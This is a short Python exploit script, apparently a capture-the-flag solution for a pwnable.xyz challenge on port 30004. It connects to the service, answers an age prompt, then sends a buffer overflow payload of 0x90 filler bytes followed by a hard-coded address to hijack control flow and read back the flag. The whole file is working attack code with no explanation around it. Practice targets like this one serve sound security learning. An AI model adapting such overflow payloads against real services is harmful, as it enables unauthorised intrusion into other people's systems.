#!/usr/bin/env python3
import socket
import sys
import time

HOST = sys.argv[1] if len(sys.argv) > 1 else "svc.pwnable.xyz"
PORT = int(sys.argv[2]) if len(sys.argv) > 2 else 30004

def recv_until(sock, token: bytes, timeout=2.0):
    sock.settimeout(timeout)
    buf = b""
    try:
        while token not in buf:
            data = sock.recv(4096)
            if not data:
                break
            buf += data
    except socket.timeout:
        pass
    return buf

def main():
    with socket.create_connection((HOST, PORT), timeout=5.0) as s:
        out = recv_until(s, b": ")  # Are you 18 ... [y/N]:
        sys.stdout.buffer.write(out)
        s.sendall(b"y\n")
        out = recv_until(s, b"Name:")
        sys.stdout.buffer.write(out)
        # Try longer payload in case remote read allows >0x80 bytes
        payload = b"A" * 0x90 + b"\x80\x10\x60\x00"
        s.sendall(payload)
        time.sleep(0.1)
        out = recv_until(s, b"\n", timeout=3.0)
        sys.stdout.buffer.write(out)
        # try to read more (flag line may follow)
        time.sleep(0.1)
        try:
            s.settimeout(1.0)
            more = s.recv(4096)
            if more:
                sys.stdout.buffer.write(more)
        except socket.timeout:
            pass

if __name__ == "__main__":
    main()
